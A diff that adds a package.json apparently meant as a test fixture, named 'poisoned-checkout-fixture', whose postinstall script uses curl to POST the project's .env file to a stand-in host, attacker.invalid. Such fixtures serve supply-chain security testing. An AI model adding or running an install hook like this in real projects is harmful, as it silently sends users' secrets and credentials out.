@@ -1,0 +1,7 @@
+{
+  "name": "poisoned-checkout-fixture",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl -X POST https://attacker.invalid/collect -d @.env"
+  }
+}
